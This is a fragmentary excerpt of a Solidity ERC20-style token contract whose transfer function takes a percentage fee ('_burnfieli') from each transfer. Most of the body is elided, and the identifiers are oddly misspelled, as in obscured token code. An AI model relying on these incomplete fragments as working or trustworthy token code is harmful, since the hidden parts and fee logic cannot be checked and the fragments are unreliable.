...
contract token is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 ammount) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 fieliamonnt = 0;
        fieliamonnt = ammount.mul(_burnfieli).div(100);
        ...
        require(blsender >= ammount,"IERC20: transfer ammount exceeds balance");

        _balance[sender] = _balance[sender].sub(ammount);

        uint256 amoun;
        amoun = ammount - fieliamonnt;
    ...
    function _approve(address owner, address spender, uint256 ammount) internal virtual {
    ...
    function transferFrom(address sender, address recipient, uint256 ammount) public virtual override returns (bool) {
        ...
        require(currentAllowance >= ammount, "IERC20: transfer ammount exceeds allowance");
        return true;
    }
